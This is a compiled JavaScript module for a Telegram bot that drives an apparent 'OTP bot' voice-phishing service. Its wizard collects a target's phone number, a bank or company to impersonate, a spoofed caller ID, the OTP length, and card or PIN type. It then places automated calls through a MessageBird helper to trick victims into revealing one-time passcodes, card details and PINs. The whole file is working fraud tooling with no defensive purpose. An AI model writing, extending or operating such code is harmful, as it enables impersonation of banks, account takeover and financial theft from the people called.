"use strict";
var __awaiter = (this && this.__awaiter) || function(thisArg, _arguments, P, generator) {
  function adopt(value) { return value instanceof P ? value : new P(function(resolve) { resolve(value); }); }
  return new (P || (P = Promise))(function(resolve, reject) {
    function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
    function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
    function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
    step((generator = generator.apply(thisArg, _arguments || [])).next());
  });
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.steps = void 0;
const telegraf_1 = require("telegraf");
const getLangAndVoice_1 = require("../languages/helpers/getLangAndVoice");
const constants_1 = require("../utils/constants");
const messagebird_1 = require("../utils/messagebird");
const getNotValidNumberMsg_1 = require("./helpers/getNotValidNumberMsg");
let chatId;
const steps = (step) => [
  (ctx) => __awaiter(void 0, void 0, void 0, function*() {
    yield ctx.replyWithHTML(`👍🏽 Awesome, Let's start\n\nReply with the number 📱\n(ex. ${Math.round(Math.random()) ? constants_1.UK_NUM : constants_1.US_NUM})\n\n<i>***request will expire in 2 minutes***</i>\n\n<b><i>~ ${step.replace(/^./, step[0].toUpperCase())} ~</i></b>`, telegraf_1.Markup.inlineKeyboard([telegraf_1.Markup.button.callback('❌ Cancel', 'cancel')]));
    ctx.wizard.state.callData = {};
    return ctx.wizard.next();
  }),
  (ctx) => __awaiter(void 0, void 0, void 0, function*() {
    if (!ctx.message) {
      yield ctx.reply('🚫 Request expired, start again\n\n', telegraf_1.Markup.inlineKeyboard([telegraf_1.Markup.button.callback('Make a call', 'call')]));
      return ctx.scene.leave();
    }
    const number = yield (0, getLangAndVoice_1.getLangAndVoice)(ctx.message.text);
    if (!number.language) {
      yield ctx.replyWithHTML(`
Country not supported yet.

We currently suport:

    🇺🇸 United State 
    🇦🇺 Australia 
    🇬🇧 Great Britain 
    🇳🇿 New Zealand 
    🇿🇦 South Africa 
    🇪🇸 Spain 
    🇵🇹 Portugal 
    🇧🇷 Brazil 
    🇮🇹 Italia 
    🇫🇷 France 
    🇩🇪 Germany 
    🇳🇴 Norway 
    🇵🇱 Poland 
    🇸🇪 Sweden 
    🇹🇷 Turkey 
    🇳🇱 Netherland 
    🇩🇰 Denmark 

Send a number of any the countries mentioned above to continue or click /cancel to start again.
      `);
      return;
    }
    yield ctx.replyWithHTML(`Good,\n\nReply with the ${step === 'account' ? 'institution name 🏢' : 'bank name 🏦'}\n(e.g ${/^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$/g.test(ctx.message.text)
      ? `${step === 'account' ? 'Gmail' : 'Barclays'}`
      : `${step === 'account' ? 'Paypal' : 'Chase'}`})\n\n<i>***request will expire in 2 minutes***</i>\n\n<b><i>~ ${step.replace(/^./, step[0].toUpperCase())} ~</i></b>`, telegraf_1.Markup.inlineKeyboard([telegraf_1.Markup.button.callback('❌ Cancel', 'cancel')]));
    ctx.wizard.state.callData.number = number;
    return ctx.wizard.next();
  }),
  (ctx) => __awaiter(void 0, void 0, void 0, function*() {
    yield ctx.replyWithHTML(`Okay,\n\nReply with the caller ID 👤\n(e.g ${/^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$/g.test(ctx.wizard.state.callData.number)
      ? '448081961740'
      : '18882019292'})\n\n<i>***request will expire in 2 minutes***</i>\n\n<b><i>~ ${step.replace(/^./, step[0].toUpperCase())} ~</i></b>`, telegraf_1.Markup.inlineKeyboard([telegraf_1.Markup.button.callback('❌ Cancel', 'cancel')]));
    ctx.wizard.state.callData.institutionName = ctx.message.text;
    return ctx.wizard.next();
  }),
  ...(step === 'pay'
    ? [
      (ctx) => __awaiter(void 0, void 0, void 0, function*() {
        const number = yield (0, getLangAndVoice_1.getLangAndVoice)(ctx.message.text);
        if (!number.language) {
          yield ctx.replyWithHTML((0, getNotValidNumberMsg_1.getNotValidNumberMsg)());
          return;
        }
        yield ctx.replyWithHTML(`Okay, how long is the OTP.\ne.g 4, 6 etc...`, telegraf_1.Markup.inlineKeyboard([
          telegraf_1.Markup.button.callback('❌ Cancel', 'cancel'),
        ]));
        ctx.wizard.state.callData.callerId = ctx.message.text;
        return ctx.wizard.next();
      }),
      (ctx) => __awaiter(void 0, void 0, void 0, function*() {
        if (!(typeof Number(ctx.message.text) === 'number')) {
          yield ctx.replyWithHTML(`Please enter a number`);
          return;
        }
        yield ctx.replyWithHTML(`Perfect, Reply with the wallet service name \n(e.g ${Math.round(Math.random()) ? 'Apple pay' : 'Google pay'})\n\n<i>***request will expire in 2 minutes***</i>\n\n<b><i>~ ${step.replace(/^./, step[0].toUpperCase())} ~</i></b>`, telegraf_1.Markup.inlineKeyboard([
          telegraf_1.Markup.button.callback('❌ Cancel', 'cancel'),
        ]));
        ctx.wizard.state.callData.otpLength = Number(ctx.message.text);
        return ctx.wizard.next();
      }),
    ]
    : []),
  ...(step === 'card'
    ? [
      (ctx) => __awaiter(void 0, void 0, void 0, function*() {
        const number = yield (0, getLangAndVoice_1.getLangAndVoice)(ctx.message.text);
        if (!number.language) {
          yield ctx.replyWithHTML((0, getNotValidNumberMsg_1.getNotValidNumberMsg)());
          return;
        }
        yield ctx.replyWithHTML(`💳 Select card type\n\n<i>***request will expire in 2 minutes***</i>\n\n<b><i>~ ${step.replace(/^./, step[0].toUpperCase())} ~</i></b>`, telegraf_1.Markup.inlineKeyboard([
          telegraf_1.Markup.button.callback('Debit', 'debit'),
          telegraf_1.Markup.button.callback('Credit', 'credit'),
        ]));
        ctx.wizard.state.callData.callerId = ctx.message.text;
        return ctx.wizard.next();
      }),
    ]
    : []),
  ...(step === 'pin'
    ? [
      (ctx) => __awaiter(void 0, void 0, void 0, function*() {
        const number = yield (0, getLangAndVoice_1.getLangAndVoice)(ctx.message.text);
        if (!number.language) {
          yield ctx.replyWithHTML((0, getNotValidNumberMsg_1.getNotValidNumberMsg)());
          return;
        }
        yield ctx.replyWithHTML(`🔐 Select pin type\n\n<i>***request will expire in 2 minutes***</i>\n\n<b><i>~ ${step.replace(/^./, step[0].toUpperCase())} ~</i></b>`, telegraf_1.Markup.inlineKeyboard([
          telegraf_1.Markup.button.callback('Carrier Pin', 'carrierPin'),
          telegraf_1.Markup.button.callback('Card Pin', 'cardPin'),
        ]));
        ctx.wizard.state.callData.callerId = ctx.message.text;
        return ctx.wizard.next();
      }),
    ]
    : []),
  ...(step === 'account'
    ? [
      (ctx) => __awaiter(void 0, void 0, void 0, function*() {
        const number = yield (0, getLangAndVoice_1.getLangAndVoice)(ctx.message.text);
        if (!number.language) {
          yield ctx.replyWithHTML((0, getNotValidNumberMsg_1.getNotValidNumberMsg)());
          return;
        }
        yield ctx.replyWithHTML(`Okay, how long is the OTP.\ne.g 4, 6 etc...`, telegraf_1.Markup.inlineKeyboard([
          telegraf_1.Markup.button.callback('❌ Cancel', 'cancel'),
        ]));
        ctx.wizard.state.callData.callerId = ctx.message.text;
        return ctx.wizard.next();
      }),
      (ctx) => __awaiter(void 0, void 0, void 0, function*() {
        if (!(typeof Number(ctx.message.text) === 'number')) {
          yield ctx.replyWithHTML(`Please enter a number`);
          return;
        }
        yield ctx.replyWithHTML("Grab card 💳 details\n\n<b>***Only click on yes if it's relevant***</b>\n\ne.g you're calling for PayPal OTP, you wouldn't ask card details for a Gmail OTP 🙄", telegraf_1.Markup.inlineKeyboard([
          telegraf_1.Markup.button.callback('Yes', 'yes'),
          telegraf_1.Markup.button.callback('No', 'no'),
        ]));
        ctx.wizard.state.callData.otpLength = Number(ctx.message.text);
        return ctx.wizard.next();
      }),
      (ctx) => __awaiter(void 0, void 0, void 0, function*() {
        yield ctx.replyWithHTML(`Click call once you have sent the OTP.\n\n<i>***request will expire in 2 minutes***</i>\n\n<b><i>~ ${step.replace(/^./, step[0].toUpperCase())} ~</i></b>`, telegraf_1.Markup.inlineKeyboard([
          telegraf_1.Markup.button.callback('Call now', 'accountCall'),
        ]));
        return ctx.wizard.next();
      }),
    ]
    : []),
  ...(step === 'pgp'
    ? [
      (ctx) => __awaiter(void 0, void 0, void 0, function*() {
        yield ctx.reply('Finally,\n\nReply with the number the call will be transfered to 👉🏽', telegraf_1.Markup.inlineKeyboard([
          telegraf_1.Markup.button.callback('❌ Cancel', 'cancel'),
        ]));
        ctx.wizard.state.callData.callerId = ctx.message.text;
        return ctx.wizard.next();
      }),
    ]
    : []),
  ...(step === `bank`
    ? [
      (ctx) => __awaiter(void 0, void 0, void 0, function*() {
        const number = yield (0, getLangAndVoice_1.getLangAndVoice)(ctx.message.text);
        if (!number.language) {
          yield ctx.replyWithHTML((0, getNotValidNumberMsg_1.getNotValidNumberMsg)());
          return;
        }
        yield ctx.replyWithHTML(`Okay, how long is the OTP.\ne.g 4, 6 etc...`, telegraf_1.Markup.inlineKeyboard([
          telegraf_1.Markup.button.callback('❌ Cancel', 'cancel'),
        ]));
        ctx.wizard.state.callData.callerId = ctx.message.text;
        return ctx.wizard.next();
      }),
    ]
    : []),
  (ctx) => __awaiter(void 0, void 0, void 0, function*() {
    var _a, _b, _c, _d, _e, _f;
    if (!ctx.wizard.state.callData) {
      return yield ctx.reply('🚫 Request expired, start again\n\n', telegraf_1.Markup.inlineKeyboard([
        telegraf_1.Markup.button.callback("🎬 Let's go", 'expired'),
      ]));
    }
    if (step === 'pgp' && !ctx.wizard.state.callData.transferNumber) {
      if (!/^(?:\+?1[-.●]?)?\(?([0-9]{3})\)?[-.●]?([0-9]{3})[-.●]?([0-9]{4})$/.test((_a = ctx === null || ctx === void 0 ? void 0 : ctx.message) === null || _a === void 0 ? void 0 : _a.text)) {
        return ctx.reply('Please enter a valid US number');
      }
      ctx.wizard.state.callData.transferNumber = (_b = ctx === null || ctx === void 0 ? void 0 : ctx.message) === null || _b === void 0 ? void 0 : _b.text;
    }
    if (step === `bank` && !ctx.wizard.state.callData.otpLength) {
      if (ctx.message &&
        !(typeof Number(ctx.message.text) === 'number')) {
        yield ctx.replyWithHTML(`Please enter a number`);
        return;
      }
      ctx.wizard.state.callData.otpLength = Number(ctx.message.text);
    }
    const w = ctx.wizard.state.callData.wallet;
    ctx.wizard.state.callData.wallet = w
      ? w
      : ctx.message && step === 'pay'
        ?
        ctx.message.text
        : undefined;
    const { number, institutionName, callerId, wallet, cardType, askCardInfo, transferNumber, pinType, otpLength, } = ctx.wizard.state.callData;
    const country = number.country;
    yield ctx.replyWithHTML(`Calling ${number.to}\nfrom ${callerId} as:\n\n${institutionName} 📲...\n\n<b><i>~ ${step.replace(/^./, step[0].toUpperCase())} ~</i>\n\n${country.flag} ${country.name}</b>`);
    chatId =
      Number(ctx.scene.state.chatId) ||
      ((_c = ctx.chat) === null || _c === void 0 ? void 0 : _c.id) ||
      ((_d = ctx.from) === null || _d === void 0 ? void 0 : _d.id) ||
      undefined;
    if (!chatId || chatId !== ((_e = ctx.chat) === null || _e === void 0 ? void 0 : _e.id) || chatId !== ((_f = ctx.from) === null || _f === void 0 ? void 0 : _f.id)) {
      return ctx.reply('🚫 Request expired, start again\n\n', telegraf_1.Markup.inlineKeyboard([telegraf_1.Markup.button.callback('Make a call', 'call')]));
    }
    yield (0, messagebird_1.messagebirdMakeACall)({
      from: callerId,
      to: number.to,
      institutionName,
      transferNumber,
      step,
      wallet,
      cardType,
      askCardInfo,
      chatId,
      pinType,
      otpLength,
      language: number.language,
    });
    return ctx.wizard.next();
  }),
];
exports.steps = steps;
